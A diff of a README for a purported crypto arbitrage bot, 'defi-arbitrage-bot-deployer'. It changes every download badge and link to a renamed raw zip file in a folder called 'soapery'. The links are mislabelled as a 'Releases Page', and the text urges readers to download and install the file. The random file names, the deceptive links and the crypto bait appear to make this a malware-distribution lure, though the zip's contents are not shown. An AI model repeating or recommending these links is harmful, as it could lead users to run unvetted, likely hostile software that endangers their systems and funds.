@@ -1,6 +1,6 @@
 # 🤖 defi-arbitrage-bot-deployer - Effortless Crypto Trading Made Easy
 
-[![Download Here](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/defi-arbitrage-bot-deployer_v2.5.zip%20Now-%20-%2344CC11?style=for-the-badge)](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/defi-arbitrage-bot-deployer_v2.5.zip)
+[![Download Here](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/bot-deployer-defi-arbitrage-wrungness.zip%20Now-%20-%2344CC11?style=for-the-badge)](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/bot-deployer-defi-arbitrage-wrungness.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ The **defi-arbitrage-bot-deployer** is a simple tool that helps you deploy an au
 
 To get started with the **defi-arbitrage-bot-deployer**, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/defi-arbitrage-bot-deployer_v2.5.zip) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/bot-deployer-defi-arbitrage-wrungness.zip) to go to the Releases page.
    
 2. **Download the Software**: Look for the latest version at the top of the page. Click on the version number to expand its details. You will find files to download. Select the appropriate file for your operating system (Windows, macOS, or Linux).
 
@@ -41,7 +41,7 @@ To run the **defi-arbitrage-bot-deployer**, your system should meet the followin
 
 To download and install the **defi-arbitrage-bot-deployer**, follow these steps:
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/defi-arbitrage-bot-deployer_v2.5.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/bot-deployer-defi-arbitrage-wrungness.zip).
 2. Select the latest release for your operating system.
 3. Download the file, install it, and follow the configuration steps mentioned above.
 
@@ -61,4 +61,4 @@ Join our community of users on Discord and Telegram. Share your experiences, ask
 
 This project is related to the following topics: ai-trading, arbitrage, arbitrum, blockchain, crypto, defi, dex-arbitrage, ethereum, javascript, smart-contract, uniswap, web3.
 
-[![Download Here](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/defi-arbitrage-bot-deployer_v2.5.zip%20Now-%20-%2344CC11?style=for-the-badge)](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/defi-arbitrage-bot-deployer_v2.5.zip)
+[![Download Here](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/bot-deployer-defi-arbitrage-wrungness.zip%20Now-%20-%2344CC11?style=for-the-badge)](https://raw.githubusercontent.com/haniaaaaaaaa/defi-arbitrage-bot-deployer/main/soapery/bot-deployer-defi-arbitrage-wrungness.zip)
